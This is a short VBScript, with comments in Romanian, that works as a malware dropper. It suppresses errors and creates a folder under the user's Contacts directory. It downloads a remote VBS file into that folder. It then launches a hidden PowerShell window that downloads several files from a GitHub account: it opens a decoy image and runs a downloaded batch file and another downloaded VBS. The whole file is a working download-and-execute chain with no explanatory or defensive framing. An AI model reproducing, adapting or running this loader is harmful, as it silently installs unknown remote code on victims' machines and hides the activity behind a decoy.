On Error Resume Next

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

targetFolder = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Contacts\zo"

If Not fso.FolderExists(targetFolder) Then
    fso.CreateFolder(targetFolder)
End If

' Descarcă won.vbs
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
xmlHttp.Open "GET", "https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/file.vbs", False
xmlHttp.Send

If xmlHttp.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write xmlHttp.ResponseBody
    stream.SaveToFile targetFolder & "\won.vbs", 2
    stream.Close
End If

' Comandă PowerShell simplificată și mai sigură
powerShellCommand = "Invoke-WebRequest 'https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/image.png' -OutFile $env:TEMP\image.png; " & _
                    "Start-Process $env:TEMP\image.png; " & _
                    "Invoke-WebRequest 'https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/file2.bat' -OutFile $env:TEMP\file2.bat; " & _
                    "Start-Process cmd -ArgumentList '/c', '$env:TEMP\file2.bat'; " & _
                    "Start-Sleep -Seconds 5; " & _
                    "Invoke-WebRequest 'https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/file.vbs' -OutFile $env:TEMP\file.vbs; " & _
                    "Start-Process wscript -ArgumentList '$env:TEMP\file.vbs'"

' Rulează comanda
shell.Run "powershell -WindowStyle Hidden -Command """ & powerShellCommand & """", 0, False
